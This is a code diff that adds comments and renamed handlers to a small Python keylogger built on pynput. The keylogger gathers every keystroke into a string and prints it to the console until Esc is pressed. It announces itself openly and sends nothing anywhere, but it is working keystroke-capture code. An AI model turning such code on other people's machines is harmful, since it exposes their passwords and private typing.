@@ -1,8 +1,12 @@
+# Import required libraries
 from pynput import keyboard
 from pynput.keyboard import Key, Listener
 
+# Declare global variable text to store the key values
+text = 'Welcome to keylogger'
 
-def on_press(key):
+# Define function onPress to detect the key values on button press
+def onPress(key):
     global text
     # Based on the key press we handle the way the key gets logged to the in memory string.
     if key == keyboard.Key.enter:
@@ -30,14 +34,16 @@ def on_press(key):
     else:
         # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
         text += str(key).strip("'")
+    print(text)
 
-
-def on_release(key):
+# Define function onRelease to detect the key values on button press
+def onRelease(key):
     if key == Key.esc:
         return False
 
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
+# Create listners to listen keyboard events
+with Listener(on_press=onPress, on_release=onRelease) as listener:
     print("!!! WELCOME TO KEYLOGGER APP !!!")
     print("!!! APP IS READY TO LISTEN THE KEYS !!!")
     listener.join()
